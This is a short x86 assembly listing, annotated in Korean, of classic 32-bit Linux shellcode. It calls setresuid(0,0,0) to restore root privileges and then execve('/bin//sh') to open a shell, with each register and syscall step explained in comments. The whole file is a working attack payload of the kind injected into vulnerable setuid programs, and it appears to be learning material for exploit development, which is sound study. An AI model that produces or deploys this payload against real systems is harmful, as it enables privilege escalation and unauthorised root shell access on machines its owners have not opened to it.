BITS 32
  
; setresuid(uid_t ruid, uid_t euid, uid_t suid);
xor eax, eax    ; EAX 레지스터의 값을 0으로 만듭니다.
xor ebx, ebx    ; EBX 레지스터의 값을 0으로 만듭니다.
xor ecx, ecx    ; ECX 레지스터의 값를 0으로 만듭니다.
xor edx, edx    ; EDX 레지스터의 값를 0으로 만듭니다.
mov al, 0xa4    ; setresuid() 시스템 함수의 콜 번호 164(0xa4)를 AL 레지스터에 저장합니다.
int 0x80        ; setresuid(0, 0, 0) 프로세스의 루트 권한 복구
  
; execve(const char *filename, char *const argv [], char *const envp[])
xor eax, eax    ; EAX 레지스터의 값을 다시 한번 0으로 만듭니다.
mov al, 11      ; execve() 시스템 함수의 콜 번호 11을 AL 레지스터에 저장합니다.
push ecx        ; 문자열의 끝을 알리기 위해 Null을 "//sh" 뒤에 저장합니다.
push 0x68732f2f ; 문자 "//sh"를 스택에 저장합니다.
push 0x6e69622f ; 문자 "/bin"를 스택에 저장합니다.
mov ebx, esp    ; ESP 레지스터에서 "/bin//sh"의 주소를 가져와 EBX 레지스터에 저장합니다.

; 2번째 인자를 위한 문자열 포인터 생성 및 3번째 인자 값 설정
push edx        ; Null을 스택에 저장합니다.
mov edx, esp    ; 3번째 인자에 Null이 저장된 주소 값을 저장합니다.
push ebx        ; Stack에 "/bin//sh" 문자열의 시작 주소를 저장합니다.
mov ecx, esp    ; 2번째 인자에 문자열 포인터가 있는 인자 배열
int 0x80        ; execve("/bin//sh",["/bin//sh",NULL],[NULL])
